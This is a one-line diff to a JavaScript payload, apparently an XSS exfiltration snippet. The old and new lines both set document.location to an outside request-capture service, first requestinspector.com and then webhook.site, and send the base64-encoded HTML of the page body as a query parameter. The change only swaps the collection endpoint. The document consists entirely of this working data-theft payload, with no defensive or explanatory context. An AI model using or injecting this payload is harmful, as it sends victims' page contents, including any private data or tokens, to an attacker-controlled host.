@@ -1,1 +1,1 @@
-document.location='//01kjcpmrjkg8k4et26v0tbbptv00-62e3158376eaeb2eadf2.requestinspector.com?c='+btoa(document.body.innerHTML)
+document.location='https://webhook.site/9d999974-cfdb-487c-be08-86f750d3f245?c='+btoa(document.body.innerHTML)
